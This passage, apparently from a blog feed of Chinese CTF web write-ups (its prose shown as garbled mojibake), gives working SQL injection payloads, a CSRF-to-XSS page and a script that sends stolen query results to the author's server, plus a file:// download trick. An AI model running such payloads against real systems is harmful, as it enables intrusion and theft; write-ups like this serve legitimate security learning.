class="string">&#x27;http://47.93.100.42:9999/api/hints&#x27;</span>,data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨gtid_subtractç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hints:&#x27;or(gtid_subtract((select(group_concat(table_name))from(information_schema.tables)where((table_schema=database()))),&#x27;&#x27;))or&#x27;</span><br><span class="line">&#123;&quot;error&quot;:&quot;Malformed GTID set specification &#x27;FdkuBNGoarFgVBwDjHcZBwwBFKNnkGDrIRubYZZtAGOifUogHPjXLyFhGxPfNWyE,Hints,MztsezsxCgHmgbYoeQGqKteosCHjfpXoGCFVjNPEpIKzFjCPYRmOMQAKgVCuoOZX,TLcLvkgTjVjFvBrUfhsqkZFMcRCVlqzEfTPxujYcwzQDtJRGzFRKqmxxapLckUBI&#x27;.&quot;&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°è¡¨åä¸€ç‰‡æ··ä¹±,å’ŒpggèŠå¤©çš„æ—¶å€™ä»–è¯´nu1lé‚£è¾¹ä¸€ç›´å¡åœ¨è¡¨åè¿™ä¸ªåœ°æ–¹2333 åæ¥ä»–ä»¬é™å®šè¡¨åé•¿åº¦æ¥æå–çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hints:&#x27;or(gtid_subtract((select(group_concat(table_name))from(information_schema.tables)where((length(table_name)=ord(&#x27;j&#x27;)^ord(&#x27;t&#x27;)))),&#x27;&#x27;))or&#x27;</span><br><span class="line">&#123;&quot;error&quot;:&quot;Malformed GTID set specification &#x27;vhEFfFlLlLaAAaaggIiIIsSSHeReEE&#x27;.&quot;&#125;</span><br></pre></td></tr></table></figure><p>è¡¨åé•¿åº¦30çš„æ—¶å€™æ‰¾åˆ°flagè¡¨,payloadæœ‰é•¿åº¦é™åˆ¶,æ‰€ä»¥çˆ†åˆ—åçš„æ—¶å€™ç¨å¾®æ”¹ä¸€ä¸‹payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hints:&#x27;gtid_subtract((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;vhEFfFlLlLaAAaaggIiIIsSSHeReEE&#x27;)),&#x27;&#x27;)#</span><br><span class="line">&#123;&quot;error&quot;:&quot;Malformed GTID set specification &#x27;ZSLRSrpOlCCysnaHUqCEIjhtWbxbMlDkUO&#x27;.&quot;&#125;</span><br><span class="line">hints:&#x27;gtid_subtract((select(ZSLRSrpOlCCysnaHUqCEIjhtWbxbMlDkUO)from(vhEFfFlLlLaAAaaggIiIIsSSHeReEE)),&#x27;&#x27;)#</span><br><span class="line">&#123;&quot;error&quot;:&quot;Malformed GTID set specification &#x27;BCTF&#123;060950FB-839E-4B57-B91D-51E78F56856F&#125;&#x27;.&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="seafaring1">SeaFaring1</h2><p>è¿™é¢˜è¯„è®ºçš„é“¾æ¥ä¼šè¢«æœºå™¨äººè®¿é—® æ³¨æ„åˆ°robots.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /admin/handle_message.php</span><br></pre></td></tr></table></figure><p>curlä¸€ä¸‹/admin å‘ç°éƒ¨åˆ†æºç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">view_uid</span>(<span class="params">uid</span>) &#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;view_uid&quot;</span>, <span class="string">&quot;uid&quot;</span>: uid&#125;,</span><br><span class="line">            <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span><br><span class="line">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">Status</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    $(<span class="string">&#x27;#timestamp&#x27;</span>).<span class="title function_">text</span>(data[<span class="string">&#x27;timestamp&#x27;</span>]);</span><br><span class="line">                    $(<span class="string">&#x27;#username&#x27;</span>).<span class="title function_">text</span>(data[<span class="string">&#x27;user_name&#x27;</span>]);</span><br><span class="line">                    $(<span class="string">&#x27;#message&#x27;</span>).<span class="title function_">text</span>(data[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">                    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;replyuid&quot;</span>).<span class="property">value</span>=data[<span class="string">&#x27;uid&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[<span class="string">&#x27;is_checked&#x27;</span>]) == <span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#04FF00&quot;&gt;Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#FFA500&quot;&gt;Not Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;status&quot;</span>).<span class="property">innerHTML</span> = <span class="title class_">Status</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">view_unreads</span>(<span class="params"></span>) &#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;view_unreads&quot;</span>, <span class="string">&quot;status&quot;</span>: <span class="number">0</span>&#125;,</span><br><span class="line">            <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span><br><span class="line">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span><br><span class="line">                    <span class="keyword">var</span> html = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">var</span> tbody = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;comments&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Time</span> = data[i][<span class="number">0</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Username</span> = data[i][<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Uid</span> = data[i][<span class="number">2</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Status</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[i][<span class="number">3</span>]) == <span class="number">1</span>) &#123;</span><br><span class="line">                            <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#04FF00&quot;&gt;Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#FFA500&quot;&gt;Not Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        html += <span class="string">&quot;&lt;tr&gt; &lt;td &gt; &lt;center&gt; &quot;</span> + <span class="title class_">Time</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;td&gt; &lt;center&gt; &quot;</span> + <span class="title class_">Username</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;td&gt; &lt;center&gt; &lt;a onclick = view_uid(&#x27;&quot;</span> + <span class="title class_">Uid</span> + <span class="string">&quot;&#x27;) &gt; &quot;</span> + <span class="title class_">Uid</span> + <span class="string">&quot; &lt;/a&gt;&lt;/center&gt; &lt;/td&gt; &lt;td&gt; &lt;center&gt; &quot;</span> + <span class="title class_">Status</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;/tr&gt;&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    tbody.<span class="property">innerHTML</span> = html;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">set_reply</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> uid = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;replyuid&quot;</span>).<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">var</span>  reply =  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;replymessage&quot;</span>).<span class="property">value</span>;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;set_reply&quot;</span>, <span class="string">&quot;uid&quot;</span>: uid, <span class="string">&quot;reply&quot;</span>: reply&#125;,</span><br><span class="line">            <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span><br><span class="line">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;Succ: &#x27;</span> + data);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">load_all</span>(<span class="params"></span>) &#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&quot;/admin/handle_message.php&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: &#123;<span class="string">&quot;token&quot;</span>: csrf_token, <span class="string">&quot;action&quot;</span>: <span class="string">&quot;load_all&quot;</span>&#125;,</span><br><span class="line">            <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!data[<span class="string">&quot;error&quot;</span>]) &#123;</span><br><span class="line">                    data = data[<span class="string">&#x27;result&#x27;</span>];</span><br><span class="line">                    <span class="keyword">var</span> html = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">var</span> tbody = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;comments&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Time</span> = data[i][<span class="number">0</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Username</span> = data[i][<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Uid</span> = data[i][<span class="number">2</span>];</span><br><span class="line">                        <span class="keyword">var</span> <span class="title class_">Status</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">parseInt</span>(data[i][<span class="number">3</span>]) == <span class="number">1</span>) &#123;</span><br><span class="line">                            <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#04FF00&quot;&gt;Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="title class_">Status</span> = <span class="string">&#x27;&lt;div style=&quot;color:#FFA500&quot;&gt;Not Checked&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        html += <span class="string">&quot;&lt;tr&gt; &lt;td &gt; &lt;center&gt; &quot;</span> + <span class="title class_">Time</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;td&gt; &lt;center&gt; &quot;</span> + <span class="title class_">Username</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;td&gt; &lt;center&gt; &lt;a onclick = view_uid(&#x27;&quot;</span> + <span class="title class_">Uid</span> + <span class="string">&quot;&#x27;) &gt; &quot;</span> + <span class="title class_">Uid</span> + <span class="string">&quot; &lt;/a&gt;&lt;/center&gt; &lt;/td&gt; &lt;td&gt; &lt;center&gt; &quot;</span> + <span class="title class_">Status</span> + <span class="string">&quot; &lt;/center&gt;&lt;/td&gt; &lt;/tr&gt;&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    tbody.<span class="property">innerHTML</span> = html;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">&#x27;Error: &#x27;</span> + data[<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">setTimeout</span>(load_all, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>å‘ç°<code>/admin/handle_message.php</code>å­˜åœ¨xss</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@Macbook:/home/blacsheep  $ curl -X POST -d <span class="string">&quot;token=&lt;img src=1 onerror=alert(/xss/)&gt;&amp;action=view_id&amp;uid=1&quot;</span> <span class="string">&#x27;http://seafaring.xctf.org.cn:9999/admin/handle_message.php&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;result&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;error&quot;</span>:<span class="string">&quot;CSRFToken  &#x27;&lt;img src=1 onerror=alert(\/xss\/)&gt;&#x27;is not correct&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ ä¸€ä¸ªhtmlé¡µé¢è®©botå»è®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    window.onload =function()&#123;</span><br><span class="line">    document.getElementById(&quot;f&quot;).submit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;form method=&quot;post&quot; action=&quot;http://seafaring.xctf.org.cn:9999/admin/handle_message.php&quot;    id=&quot;f&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;script src=http://t.cn/ELTmXGg&gt;&lt;/script&gt;&lt;script src=http://localhost/bctf_evil_oqwej98czc.js&gt;&lt;/script&gt;&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;view_id&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;uid&quot; value=&quot;1&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>å¤–éƒ¨å¼•å…¥çš„jsæ–‡ä»¶(æ”¹è‡ªNu1lçš„å¸ˆå‚…)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">req</span>(<span class="params">url,data</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,url,<span class="literal">false</span>);</span><br><span class="line">    xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/x-www-formurlencoded&quot;</span>);</span><br><span class="line">    xhr.<span class="title function_">send</span>(data);</span><br><span class="line">    <span class="keyword">var</span> resp = xhr.<span class="property">responseText</span>;</span><br><span class="line">    <span class="keyword">return</span> resp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_csrf_token</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://seafaring.xctf.org.cn:9999/admin/index.php&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">    xhr.<span class="title function_">send</span>();</span><br><span class="line">    <span class="keyword">var</span> res = xhr.<span class="property">responseText</span>;</span><br><span class="line">    <span class="keyword">var</span> csrftoken = res.<span class="title function_">match</span>(<span class="regexp">/csrf_token = \&quot;([a-z0-9]*)\&quot;/ig</span>)[<span class="number">0</span>].<span class="title function_">split</span>(<span class="string">&#x27;=&quot;&#x27;</span>)[<span class="number">1</span>].<span class="title function_">replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> csrftoken;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">send</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    location.<span class="property">href</span> = <span class="string">&quot;http://localhost/log.php?data=&quot;</span>+<span class="built_in">escape</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ress=<span class="title function_">req</span>(<span class="string">&quot;http://172.20.0.2:6379/&quot;</span>,<span class="string">&quot;token=&quot;</span>+<span class="title function_">get_csrf_token</span>()+<span class="string">&quot;&amp;action=view_unreads&amp;status=3%20%20and%201%3D2%20union%20select%201%2Cload_file%280x2f70726f632f6e65742f617270%29%2C3%2C4%20from%20f111111ag%23&quot;</span>);</span><br><span class="line"><span class="title function_">send</span>(ress);</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥åœ¨vpsä¸Šé¢æ”¶ç»“æœäº† ä¸è¿‡å¤ç°çš„æ—¶å€™å‘ç°å¹¶æ²¡æœ‰æ”¶åˆ°ç»“æœ çœ‹äº†ä¸‹æ—¥å¿—å‘ç°botåªæ˜¯è®¿é—®äº†csrfé¡µé¢è€Œå¹¶æ²¡æœ‰è½½å…¥jsæ–‡ä»¶...ä¸å¤ªæ¸…æ¥šåŸå›  è®¿é—®æˆåŠŸä¹‹åå°±å‘ç°æ˜¯ä¸ªåå°çš„sqlæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;sql query error! debug info:SELECT</span><br><span class="line">timestamp,user_name,uid,is_checked,message FROM feedbacks where uid=&#x27;1\\&#x27;or</span><br><span class="line">1#&#x27; ORDER BY id DESC &quot;&#125;</span><br></pre></td></tr></table></figure><p>ç”¨äº†addslashes,ä½†æ˜¯æœ‰ä¸€ä¸ªæ¥å£æ˜¯æ•´å½¢æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;sql query error! debug info:SELECT</span><br><span class="line">timestamp,user_name,uid,is_checked FROM feedbacks where is_checked=1\\&#x27;</span><br><span class="line">ORDER BY id DESC limit 0,50&quot;&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥è·‘å°±æ‹¿åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:[[&quot;1&quot;,&quot;bctf&#123;XsS_SQL1_7438x_2xfccmk&#125;&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure><p>è‡ªå·±åšçš„æ—¶å€™å‘ç°çš„xssæ˜¯ç™»å½•ç•Œé¢çš„xss...æ²¡å‘ç°åå°çš„tokenå¯ä»¥xss...ç™»å½•å¤„çš„è§¦å‘éœ€è¦æ’éªŒè¯ç ...æ‰€ä»¥postäº†å‡ ç™¾ä¸ªåŒ…..åæ¥å‘ç°botè®¿é—®åœ°è¶…çº§æ…¢ç¬¬äºŒå¤©å°±è¢«æŸ¥æ°´è¡¨2333... ä¸è¿‡æ€è·¯æ²¡å•¥é—®é¢˜,csrfæ§åˆ¶botå»è§¦å‘xssè½½å…¥jsæ–‡ä»¶,å½“æ—¶æƒ³æ³•æ˜¯å¦‚æœæ‰“åˆ°xssçœ‹ä¸‹åå°é¡µé¢å­˜ä¸å­˜åœ¨å…¶ä»–æœ‰ç”¨çš„ä¸œè¥¿,ä¸è¿‡xssæ‰¾é”™äº†,å¾ˆå¯æƒœ...ä¸è¿‡åæ­£ä¹Ÿä¸ä¼šcsrf...æ”¶äº†Nu1lå¸ˆå‚…çš„csrfpayloadäº†ORZ</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2018éª‡ææ¯webwp</title>
      <link href="/2018/11/05/2018%E9%AA%87%E6%9E%81%E6%9D%AFwebwp/"/>
      <url>/2018/11/05/2018%E9%AA%87%E6%9E%81%E6%9D%AFwebwp/</url>
      
        <content type="html"><![CDATA[<p>é¢˜ç›®æ²¡ä»€ä¹ˆæ„Ÿè§‰,ä»å…¶ä»–å¸ˆå‚…é‚£é‡Œè¿˜æ˜¯èƒ½å­¦åˆ°ä¸œè¥¿çš„</p><h2 id="web1">web1</h2><p>è¿›å»è®©çœ‹robots.txt,å‘ç°source.phpå’Œflag.php å»source.phpçœ‹ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you need to login as admin!&lt;!-- post param  &#x27;admin&#x27; --&gt;</span><br></pre></td></tr></table></figure><p>åæ­£å„ç§æ”¹å¤´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@Macbook:/home/blacsheep  $ curl -X POST --data <span class="string">&quot;admin=1&amp;url=http://www.ichunqiu.com&quot;</span> -H <span class="string">&quot;X-Client-Ip:127.0.0.1&quot;</span> <span class="string">&quot;http://e68314a9bc484ec0b24fb92e983038184bb2eb5bf0094b3c.game.ichunqiu.com/source.php&quot;</span></span><br><span class="line">you need to login as admin!&lt;!-- post param  <span class="string">&#x27;admin&#x27;</span> --&gt;http://www.ichunqiu.com&lt;img src=<span class="string">&quot;download/1776243742;img1.jpg&quot;</span>/&gt;% </span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯ä¸ªdownloadçš„åŠŸèƒ½ é‚£ä¹ˆå»ä¸‹è½½flag.php,ç”¨fileåè®®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@Macbook:/home/blacsheep  $ curl -X POST --data <span class="string">&quot;admin=1&amp;url=file://www.ichunqiu.com/var/www/html/flag.php&quot;</span> -H <span class="string">&quot;X-Client-Ip:127.0.0.1&quot;</span> <span class="string">&quot;http://e68314a9bc484ec0b24fb92e983038184bb2eb5bf0094b3c.game.ichunqiu.com/source.php&quot;</span> </span><br><span class="line">you need to login as admin!&lt;!-- post param  <span class="string">&#x27;admin&#x27;</span> --&gt;file://www.ichunqiu.com/var/www/html/flag.php&lt;img src=<span class="string">&quot;download/1574241457;img1.jpg&quot;</span>/&gt;%                  blacsheep@Macbook:/home/blacsheep  $ curl <span class="string">&quot;http://e68314a9bc484ec0b24fb92e983038184bb2eb5bf0094b3c.game.ichunqiu.com/download/1574241457;img1.jpg&quot;</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span>=<span 